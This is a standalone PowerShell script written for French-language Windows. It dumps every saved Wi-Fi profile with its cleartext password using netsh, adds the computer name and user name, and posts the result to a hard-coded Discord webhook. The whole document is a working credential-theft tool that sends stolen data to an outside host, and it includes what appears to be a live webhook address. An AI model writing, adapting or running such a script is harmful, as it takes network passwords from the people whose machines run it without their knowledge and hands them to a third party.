$webhookUrl = "https://discord.com/api/webhooks/1501460061439004732/fE-P3g0HI2ha_ZKMhWmn1woNkl8yzMz_sLLFffMnk4xa1JtNDy0PodilxIiB7BlEvS_m"

[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$OutputEncoding = [System.Text.Encoding]::UTF8

$results = @()

$profiles = netsh wlan show profiles |
    Where-Object { $_ -match ":" -and $_ -notmatch "Profils sur" } |
    ForEach-Object { ($_ -split ":\s*", 2)[1].Trim() } |
    Where-Object { $_ -ne "" }

foreach ($profile in $profiles) {
    $details = netsh wlan show profile name="$profile" key=clear
    $passwordLine = $details | Where-Object { $_ -match "Contenu de la cl" }
    $password = if ($passwordLine) { ($passwordLine -split ":\s*", 2)[1].Trim() } else { "(aucun)" }

    $results += [PSCustomObject]@{
        SSID       = $profile
        Password = $password
    }
}

$machine     = $env:COMPUTERNAME
$utilisateur = $env:USERNAME
$date        = Get-Date -Format "yyyy-MM-dd HH:mm"

$lignes = $results | ForEach-Object { "- $($_.SSID) : $($_.Password)" }
$texte  = $lignes -join "`n"
$texteEchappe = $texte.Replace('"', '\"').Replace("`n", '\n').Replace("`r", '')
$remplacement = '"```\n' + $texteEchappe + '\n```"'

$payload = [ordered]@{
    embeds   = @(@{
        title  = "Nouvelles infos"
        color  = 3447003
        fields = @(
            @{ name = "Machine";     value = $machine;     inline = $true  }
            @{ name = "Utilisateur"; value = $utilisateur; inline = $true  }
            @{ name = "Date";        value = $date;        inline = $false }
            @{ name = "SSID / Mot de passe";        value = "PLACEHOLDER"; inline = $false }
        )
    })
}

$json  = $payload | ConvertTo-Json -Depth 5 -Compress
$body  = $json -replace '"PLACEHOLDER"', $remplacement
$bytes = [System.Text.Encoding]::UTF8.GetBytes($body)

Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $bytes -ContentType "application/json; charset=utf-8"
